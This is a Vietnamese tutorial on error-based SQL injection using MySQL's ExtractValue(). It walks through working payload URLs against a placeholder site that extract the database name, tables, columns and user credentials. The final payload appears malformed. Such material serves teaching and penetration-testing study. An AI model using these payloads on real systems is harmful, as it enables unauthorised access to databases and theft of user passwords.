### Người thực hiện: Trần Ngọc Nam
### Thời gian: 20/04/2022

## Error Based Injection using Extractvalue:

- Ta chỉ sử dụng một trong các chức năng XPATH đó là Extractvalue() để tạo ra lỗi và nhận được đầu ra.
- Hàm & qout; ExtractValue&qout trong MySQL chạy truy vấn XPath dựa trên chuỗi đại diện cho dữ liệu XML. Hàm lấy đầu vào có dạng: <code>ExtractValue('xmldatahere', 'xpathqueryhere')</code>.
- Nếu truy vấn XPath không chính xác về mặt cú pháp, ta nhận được thông báo lỗi: <code>XPATH syntax error: 'xpathqueryhere'</code>.
- Bây giờ, ta hãy thử tấn công bằng cách sử dụng tiêm XPATH <code>www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--</code>.
- Đầu tiên, ta sẽ lấy cơ sở dữ liệu hiện tại.
  ```php
  www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
  Output : XPATH syntax error: ' database_name_here'
  ```
- Khi đó, ta đã có tên cơ sở dữ liệu.
- Tiếp theo, ta sẽ tìm các bảng trong cơ sở dữ liệu vừa tìm được.
  ```php
  www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--
  Output : XPATH syntax error: 'table_name_here'
  ```
- Ở đây, ta sử dụng giới hạn vì ta không thể trích xuất dữ liệu có độ dài giới hạn tối đa 32 ký tự.
- Giả sử, ta có các bảng sau khi sử dụng truy vấn phía trên: <code>Posts</code>, <code>Assets</code>, <code>Banner</code>, <code>Links</code>, <code>Users</code>.
- Sau đó, ta có thể lấy thông tin các cột của table <code>users</code> thông qua: 
  ```php
  www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--
  Output : XPATH syntax error: 'column_name_here'
  ```
- Sau khi thực hiện, ta sẽ nhận được tên các cột trong bảng users như <code>id</code>, <code>username</code>, <code>password</code>.
- Tiếp theo, ta có thể đếm số người dùng trong bảng <code>users</code>
  ```php
  www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))--
  Output : XPATH syntax error: 'count_will_come_here'

  Hoặc

  www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--
  Output : XPATH syntax error: 'Output_here'
  ```
